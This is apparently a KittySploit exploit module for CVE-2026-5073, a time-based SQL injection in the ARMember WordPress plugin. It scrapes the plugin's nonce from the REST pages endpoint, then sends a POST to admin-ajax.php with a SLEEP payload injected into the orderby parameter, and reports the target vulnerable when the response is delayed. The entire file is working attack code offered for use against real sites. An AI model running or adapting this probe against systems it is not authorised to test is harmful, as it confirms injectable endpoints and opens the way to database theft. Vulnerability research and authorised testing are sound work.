#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ARMember CVE-2026-5073 — orderby time-based SQLi."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "ARMember CVE-2026-5073 SQLi probe",
        "description": "POST arm_directory_paging_action with SLEEP in orderby.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-5073"],
        "tags": ["wordpress", "armember", "sqli", "cve-2026-5073"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    arm_nonce = OptString("", "arm_wp_nonce (auto from REST pages if empty)", required=False)
    sleep_seconds = OptInteger(8, "SLEEP seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _resolve_nonce(self) -> str:
        forced = (self.arm_nonce or "").strip()
        if forced:
            return forced
        rest = self.http_request(
            method="GET",
            path=self._join("/index.php"),
            params={"rest_route": "/wp/v2/pages", "per_page": "100"},
            allow_redirects=False,
        )
        m = re.search(r"name='arm_wp_nonce'[^>]*value='([a-f0-9]+)'", rest.text or "") if rest else None
        return m.group(1) if m else ""

    def run(self):
        nonce = self._resolve_nonce()
        if not nonce:
            print_error("arm_wp_nonce not found")
            return False
        sleep_s = int(self.sleep_seconds or 8)
        orderby = f"display_name,IF(1=1,SLEEP({sleep_s}),0)"
        start = time.monotonic()
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "arm_directory_paging_action",
                "pagination": "infinite",
                "id": "1",
                "type": "directory",
                "orderby": orderby,
                "order": "ASC",
                "per_page": "10",
                "current_page": "1",
                "arm_wp_nonce": nonce,
            },
            allow_redirects=False,
            timeout=30,
        )
        elapsed = time.monotonic() - start
        if elapsed >= sleep_s - 1 and resp and "arm_directory_paging_container" in (resp.text or ""):
            print_success(f"SQLi delay ~{elapsed:.1f}s")
            return True
        print_error(f"Probe failed ({elapsed:.1f}s)")
        return False
